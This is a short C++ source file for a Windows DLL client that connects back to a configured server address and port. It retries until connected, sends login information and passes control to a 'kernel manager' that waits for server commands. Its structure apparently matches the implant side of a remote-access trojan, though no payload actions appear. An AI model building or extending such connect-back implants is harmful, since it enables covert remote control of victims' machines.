#include "Dll.h"

char __ServerAddress[MAX_PATH] = { 0 };
unsigned short __ConnectPort = 0;
HINSTANCE 	__InstanceHandle;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		//����һ��exeģ�飨���ص�ǰ��dllģ�飩
		__InstanceHandle = (HINSTANCE)hModule;
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}



void ClientRun(char* ServerIPAddress, USHORT ServerConnectPort)
{
	memcpy(__ServerAddress, ServerIPAddress, strlen(ServerIPAddress));
	__ConnectPort = ServerConnectPort;
	//����һ�������߳�
	HANDLE ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
		NULL, 0, NULL);
	int a =GetLastError();
	//�ȴ�ָ���Ķ������ź�״̬�򾭹���ʱ�����
	//�ȴ������̵߳������˳�
	WaitForSingleObject(ThreadHandle, INFINITE);
	printf("client bye bye!!!\r\n");
	
	if (ThreadHandle!=NULL)
	{
		CloseHandle(ThreadHandle);
	}
}

DWORD WINAPI WorkThreadProcedure(LPVOID ParaeterData)
{
	_CIOCPClient IOCPClient;
	BOOL IsOk = FALSE;
	while (1)
	{
		if (IsOk==TRUE)
		{
			break;
		}

		//���һ�������
		DWORD TickCount = GetTickCount();
		//ConnectServer������������ݵ��߳�while(1)->m_ManagerObject()->HandleIO()�ȴ����ݵ���
		if (!IOCPClient.ConnectServer(__ServerAddress, __ConnectPort))
		{
			continue;
		}
		//�������������һ������
		//���͵�һ������
		SendLoginInformation(&IOCPClient, GetTickCount() - TickCount);
		//�����������ݵĻ���
		CKernelManager	KernelManagerObject(&IOCPClient);

		do
		{
			IsOk = WaitForSingleObject(IOCPClient.m_EventHandle, 100);

			IsOk = IsOk - WAIT_OBJECT_0;


		} while (IsOk!=0);
		IsOk = TRUE;
	}
	return 0;
}